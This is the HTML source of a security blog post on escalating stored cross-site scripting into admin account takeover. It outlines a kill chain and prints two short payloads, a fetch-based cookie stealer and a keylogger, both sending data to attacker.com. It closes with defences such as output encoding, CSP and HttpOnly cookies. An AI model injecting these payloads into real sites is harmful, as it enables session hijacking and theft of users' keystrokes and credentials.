<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The Web Exploitation Journey | RedRecon Blog</title>
    <link rel="stylesheet" href="../../css/style.css">
    <style>
        .blog-header {
            border-bottom: 2px solid var(--neon-cyan);
            padding-bottom: 20px;
            margin-bottom: 40px;
        }

        .blog-header h1 {
            color: white;
            font-size: 2.2rem;
            margin-bottom: 10px;
        }

        .highlight-box {
            background: rgba(0, 243, 255, 0.05);
            border-left: 4px solid var(--neon-cyan);
            padding: 20px;
            margin: 30px 0;
            color: #ddd;
        }

        .highlight-box.alert {
            border-left-color: var(--neon-red);
            background: rgba(255, 42, 42, 0.05);
        }

        .nav-back {
            margin-bottom: 30px;
            font-family: var(--font-code);
        }

        .nav-back a {
            text-decoration: none;
            color: var(--text-muted);
        }

        .nav-back a:hover {
            color: var(--neon-cyan);
        }

        h2 {
            color: var(--neon-green);
            margin-top: 40px;
            border-bottom: 1px solid var(--border-dim);
            padding-bottom: 10px;
        }

        h3 {
            color: white;
            margin-top: 30px;
            font-size: 1.3rem;
        }

        p {
            color: var(--text-primary);
            line-height: 1.8;
            margin-bottom: 1.2rem;
        }

        ul,
        ol {
            margin-bottom: 20px;
            padding-left: 20px;
            color: var(--text-muted);
        }

        li {
            margin-bottom: 10px;
            line-height: 1.6;
        }

        pre {
            background-color: #000;
            border: 1px solid var(--border-dim);
            border-left: 3px solid var(--neon-cyan);
            padding: 1.5rem;
            overflow-x: auto;
            margin: 20px 0;
            font-family: var(--font-code);
        }

        code {
            color: var(--neon-cyan);
            font-family: var(--font-code);
        }
    </style>
</head>

<body class="hacker-mode">

    <nav class="top-nav">
        <div class="logo" style="display:flex; align-items:center; gap:10px;">
            <img src="../../img/redsec_alliance.png" alt="RedSec Logo" style="height:40px; width:auto;">
            <div style="display:flex; flex-direction:column; line-height:1.1;">
                <span class="user-name" style="font-size:1.2rem; letter-spacing:1px;">REDSEC INTELLIGENCE</span>
                <span class="role" style="font-size:0.7rem; color:var(--text-muted);">OFFENSIVE SECURITY RESEARCH</span>
            </div>
        </div>
        <div class="controls">
            <div class="toggle-group" style="margin-right: 15px;">
                <span class="lang-opt" data-lang="pt"
                    onclick="window.location.href='../../blog/web-exploitation-journey.html'"
                    style="cursor:pointer; opacity:0.4; font-size:1.2rem; margin-right:5px;">üáßüá∑</span>
                <span class="lang-opt active" data-lang="en"
                    style="cursor:pointer; opacity:1.0; font-size:1.2rem; margin-right:5px;">üá∫üá∏</span>
            </div>
            <div class="toggle-group">
                <button id="theme-toggle" class="btn-toggle">HACKER_MODE</button>
            </div>
            <div class="nav-links">
                <a href="../../index.html">DASHBOARD</a>
                <a href="../../library.html">LIBRARY</a>
                <a href="../../blog.html">BLOG</a>
                <a href="../../profile.html" data-i18n="nav_about">PROFILE</a>
            </div>
        </div>
    </nav>

    <div class="main-container" style="max-width: 900px;">

        <div class="nav-back">
            <a href="../../blog.html">‚Üê BACK TO BLOG</a>
        </div>

        <article>
            <header class="blog-header">
                <h1>The Web Exploitation Journey</h1>
                <div style="color:var(--text-muted); font-family:var(--font-code); font-size:0.9rem;">
                    <strong>TOPIC:</strong> DEEP DIVE XSS // <strong>READ:</strong> 8 MIN
                </div>
            </header>

            <section>
                <h2>üåê The Scenario: Web Apps as the External Gate</h2>
                <div class="highlight-box">
                    <strong>Reflection:</strong> While Active Directory protects the internal network, web applications
                    are where the world knocks on the door. #Escalating XSS: From a simple alert to total control.
                </div>
                <p><strong>Cross-Site Scripting (XSS)</strong> is often dismissed as a "low impact" vulnerability
                    compared to SQL Injection or RCE. However, this is a dangerous and outdated view. Stored XSS
                    combined with <strong>Account Takeover (ATO)</strong> logic creates a critical "Kill Chain" that can
                    lead to total administrative compromise without triggering a single firewall alarm.</p>
            </section>

            <section>
                <h2>1. The Mechanics of Stored XSS</h2>
                <p>Unlike Reflected XSS (which requires a user to click a specific link), <strong>Stored XSS</strong>
                    (Persistent) occurs when the malicious payload is saved by the server‚Äîin a comment database, a
                    profile biography field, or even a filename.</p>
                <p>The trap is passive: the attacker posts a comment and waits. The trigger occurs when an Administrator
                    views the comment on their control panel, executing the script in the context of the Admin's
                    super-privileged session.</p>
            </section>

            <section>
                <h2>2. The Kill Chain</h2>
                <p>A Red Teamer's goal is never just to pop an <code>alert(1)</code> box. The goal is persistence and
                    elevation. See the anatomy of the attack:</p>

                <ol>
                    <li><strong>Injection:</strong> The attacker identifies an input field without sanitization (e.g.,
                        "Purchase Description" or "Username").</li>
                    <li><strong>Payload Construction:</strong> The JavaScript is designed to read
                        <code>document.cookie</code> or intercept actions.</li>
                    <li><strong>Exfiltration:</strong> The payload uses asynchronous APIs to send stolen data to a
                        server under the attacker's control.</li>
                    <li><strong>Impersonation:</strong> The attacker injects the stolen Session ID into their browser
                        and refreshes the page, assuming the Administrator's identity.</li>
                </ol>
            </section>

            <section>
                <h2>3. Payload Engineering: The Modern "Cookie Stealer"</h2>
                <p>Simple <code>&lt;img&gt;</code> based payloads are a thing of the past. Modern Red Teamers use the
                    <code>fetch</code> API for silent and robust exfiltration.</p>

                <h3>Exfiltration via Fetch (CORS Bypass)</h3>
                <p>This payload sends cookies to the attacker without generating visible CORS (Cross-Origin Resource
                    Sharing) errors in the console, thanks to <code>no-cors</code> mode, maintaining stealth.</p>

                <pre><code>&lt;script&gt;
  fetch('https://attacker.com/log', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
  });
&lt;/script&gt;</code></pre>

                <h3>Keylogging and Form Hijacking</h3>
                <p>If the cookie is protected by the <code>HttpOnly</code> flag (preventing JS reading), the attacker
                    pivots to capturing keystrokes or hijacking password change forms.</p>

                <pre><code>&lt;script&gt;
// Basic Keylogger
document.onkeypress = function(e) {
    fetch('https://attacker.com/k?key=' + e.key);
}
&lt;/script&gt;</code></pre>
            </section>

            <section>
                <h2>4. Case Study: Ghost CMS (CVE-2024-23724)</h2>
                <p>A real and recent example: Ghost CMS (v5.76.0). The vulnerability lay in the "Newsletter" settings,
                    which permitted script injection.</p>
                <div class="highlight-box alert">
                    <strong>The Impact:</strong> When the blog owner (Admin) accessed the settings, the script executed
                    and silently created a <strong>new Administrator account</strong> for the attacker, handing over
                    total ownership of the CMS.
                </div>
            </section>

            <section>
                <h2>5. Defense in Depth</h2>
                <p>To prevent your application from becoming the next case study:</p>
                <ul>
                    <li><strong>Output Encoding:</strong> Always encode data before rendering (e.g., convert
                        <code>&lt;</code> to <code>&amp;lt;</code>). Modern frameworks (React, Vue) do this by default.
                    </li>
                    <li><strong>Content Security Policy (CSP):</strong> Implement a strict CSP
                        (<code>script-src 'self'</code>) to prevent unauthorized script execution.</li>
                    <li><strong>HttpOnly:</strong> Flag all session cookies as <code>HttpOnly</code> to mitigate direct
                        token theft.</li>
                </ul>
            </section>

            <section>
                <h2>Conclusion</h2>
                <p>Are you just finding flaws or building attack chains? The difference between a vulnerability scanner
                    and a human Red Teamer is the ability to understand context and elevate the impact from "trivial" to
                    "critical".</p>
                <div class="highlight-box">
                    <strong>Further Reading:</strong> Master advanced techniques with our <a
                        href="cyber-intelligence-report-2025.html" style="color:var(--neon-green);">Intelligence Report
                        2025</a>.
                </div>
            </section>

        </article>

        <footer>
            <div
                style="margin-top: 50px; border-top: 1px solid var(--border-dim); padding-top: 20px; text-align: center; color: var(--text-muted); font-size: 0.8rem;">
                <p>RedRecon Blog ¬© 2025</p>
            </div>
        </footer>

    </div>
    <script src="../../js/translations.js"></script>
    <script src="../../js/script.js"></script>
</body>

</html>